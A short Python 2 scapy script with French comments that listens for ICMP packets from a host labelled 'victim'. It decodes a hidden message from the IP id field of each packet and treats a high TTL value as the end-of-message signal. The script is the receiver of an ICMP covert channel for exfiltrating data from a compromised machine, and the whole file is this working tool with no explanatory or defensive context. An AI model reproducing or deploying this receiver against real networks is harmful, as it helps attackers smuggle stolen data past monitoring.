#!/usr/bin/env python
# -*- coding: iso-8859-15 -*-

from scapy.all import *
conf.verb=0

def traitePaquet(p):
	if p[IP].ttl > 230: 
		print ""
		sys.exit(0)
	sys.stdout.write(chr(p[IP].id))

sniff(
	filter = "icmp and src //@victim//",
	lfilter = lambda p: p.haslayer(ICMP) and p[IP].id < 256,
	prn = traitePaquet,		#}Pour le traitement en live
	store = 0,			#}
)
